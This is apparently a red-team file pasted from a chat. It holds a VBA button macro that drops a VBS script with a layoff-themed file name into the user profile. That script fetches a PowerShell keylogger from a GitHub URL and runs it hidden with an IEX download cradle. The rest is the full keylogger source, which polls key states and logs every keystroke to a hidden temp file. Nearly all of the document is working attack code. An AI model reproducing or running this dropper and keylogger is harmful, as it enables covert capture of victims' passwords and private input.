 Private Sub CommandButton1_Click()
    Dim myoutputfile As Integer
    Dim FilePath As String
    Set oShell = CreateObject("WScript.Shell")
    userProfilePath = oShell.ExpandEnvironmentStrings("%UserProfile%")
    myFile = userProfilePath + "\layoffs15.vbs"
    myoutputfile = FreeFile
    Open myFile For Output As #myoutputfile
    Print #myoutputfile, "HTTPDownload ""https://raw.githubusercontent.com/FerdiGul/RedTeam/main/keylogger.ps1"", """ & userProfilePath & """"; ""
    Print #myoutputfile, "Sub HTTPDownload( myURL, myPath )"
    Print #myoutputfile, "     Dim i, objFile, objFSO, objHTTP, strFile, strMsg"
    Print #myoutputfile, "     Const ForReading = 1, ForWriting = 2, ForAppending = 8"
    Print #myoutputfile, "     Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
    Print #myoutputfile, "     If objFSO.FolderExists(myPath) Then"
    Print #myoutputfile, "          strFile = objFSO.BuildPath(myPath, Mid(myURL, InStrRev(myURL, ""/"") + 1))"
    Print #myoutputfile, "     ElseIf objFSO.FolderExists(Left(myPath, InStrRev(myPath, "" \ "") - 1)) Then"
    Print #myoutputfile, "          strFile = myPath"
    Print #myoutputfile, "     Else"
    Print #myoutputfile, "          WScript.Echo ""ERROR: Target folder not found."""
    Print #myoutputfile, "          Exit Sub"
    Print #myoutputfile, "     End If"
    Print #myoutputfile, "     Set objFile = objFSO.OpenTextFile(strFile, ForWriting, True)"
    Print #myoutputfile, "     Set objHTTP = CreateObject(""WinHttp.WinHttpRequest.5.1"")"
    Print #myoutputfile, "     objHTTP.Open ""GET"", myURL, False"
    Print #myoutputfile, "     objHTTP.Send"
    Print #myoutputfile, "     For i = 1 To LenB(objHTTP.ResponseBody)"
    Print #myoutputfile, "          objFile.Write Chr(AscB(MidB(objHTTP.ResponseBody, i, 1)))"
    Print #myoutputfile, "     Next"
    Print #myoutputfile, "     objFile.Close( )"
    Print #myoutputfile, "     Set WshShell = WScript.CreateObject(""WScript.Shell"")"
Print #myoutputfile, "     WshShell.Run """"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"""" IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FerdiGul/RedTeam/main/keylogger.ps1')"",2 "
    Print #myoutputfile, "End Sub"
    Close #myoutputfile
    Shell Replace("wscript ""FILE"" ", "FILE", myFile)
End Sub
 
Private Sub backdoorButton_Click()
 
End Sub

[10:21] Ferdi Gül
  
function Start-KYLGR($Path="$env:temp\hidden.txt") 
{
 
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
  
  $null = New-Item -Path $Path -ItemType File -Force
 
  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 
  
    while ($true) {
      Start-Sleep -Milliseconds 40
   
      for ($ascii = 9; $ascii -le 254; $ascii++) {
       
        $state = $API::GetAsyncKeyState($ascii)
 
        if ($state -eq -32767) {
          $null = [console]::CapsLock
 
 
          $virtualKey = $API::MapVirtualKey($ascii, 3)
 
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
 
  
          $mychar = New-Object -TypeName System.Text.StringBuilder
 
         
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
          if ($success) 
          {
     
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
 
    notepad $Path
  }
}
 
Start-KYLGR
 

